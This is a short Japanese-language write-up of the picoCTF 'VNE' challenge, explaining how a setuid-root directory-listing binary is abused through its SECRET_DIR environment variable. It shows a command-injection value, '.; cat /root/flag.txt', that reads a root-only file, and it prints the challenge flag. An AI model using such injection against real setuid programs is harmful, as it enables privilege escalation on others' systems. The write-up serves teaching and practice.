# picoCTF Writeup: VNE

環境変数を操作する問題

- ジャンル: Binary Exploitation
- 難易度: Medium

## Writeup
問題文
>We've got a binary that can list directories as root, try it out !!
ssh to saturn.picoctf.net:63203, and run the binary named "bin" once connected. Login as ctf-player with the password, fd7746b4
>rootとしてディレクトリを一覧できるバイナリがあります。試してみて。
>sshして、binというバイナリを実行して。

では、早速sshします。
`$ ssh -p 63203 ctf-player@saturn.picoctf.net`

```
ctf-player@pico-chall$ ls -la
total 24
drwxr-xr-x 1 ctf-player ctf-player    20 Dec 29 22:08 .
drwxr-xr-x 1 root       root          24 Aug  4  2023 ..
drwx------ 2 ctf-player ctf-player    34 Dec 29 22:08 .cache
-rw-r--r-- 1 root       root          67 Aug  4  2023 .profile
-rwsr-xr-x 1 root       root       18752 Aug  4  2023 bin
```

お、`bin`は確かに`root`で実行できるようですね。
`-rwsr-xr-x 1 root       root       18752 Aug  4  2023 bin`

実行してみますか。
```
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
```

`SECRET_DIR`という環境変数がセットされてないよ、というエラーですね。
`SECRET_DIR`に`/root`をセットしてみます。
```
ctf-player@pico-chall$ export SECRET_DIR=/root
ctf-player@pico-chall$ ./bin
Listing the content of /root as root: 
flag.txt
```

`flag.txt`ありましたね。

どうやったら`flag.txt`の中身がみれるでしょうか？

たぶんこのバイナリは`ls ($SECRET_DIR)`みたいなことになっていると思います。
つまり、`$SECRET_DIR`に他のコマンドも入れられるかもしれません。

`export SECRET_DIR=".; cat /root/flag.txt"`を入れて`cat`できるか試します。

```
ctf-player@pico-chall$ export SECRET_DIR=".; cat /root/flag.txt"
ctf-player@pico-chall$ ./bin
Listing the content of .; cat /root/flag.txt as root:
bin
picoCTF{Power_t0_man!pul4t3_3nv_fc3ff2c9}
```
flagとれました。


## 余談
ちょっと`SQLi`に似てるなと思いました。